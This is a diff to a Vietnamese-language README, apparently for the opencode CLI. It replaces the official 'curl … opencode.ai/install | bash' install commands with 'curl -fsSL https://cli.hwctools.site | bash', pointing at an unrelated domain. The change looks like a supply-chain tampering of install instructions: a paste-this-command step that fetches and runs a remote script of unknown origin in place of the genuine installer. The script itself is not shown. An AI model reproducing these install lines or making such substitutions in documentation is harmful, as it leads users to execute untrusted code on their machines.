@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/install | bash
+curl -fsSL https://cli.hwctools.site | bash
 
 # Các trình quản lý gói (Package managers)
 npm i -g opencode-ai@latest        # hoặc bun/pnpm/yarn
@@ -93,8 +93,8 @@ Tập lệnh cài đặt tuân theo thứ tự ưu tiên sau cho đường dẫn
 
 ```bash
 # Ví dụ
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
-XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://cli.hwctools.site | bash
+XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://cli.hwctools.site | bash
 ```
 
 ### Agents (Đại diện)
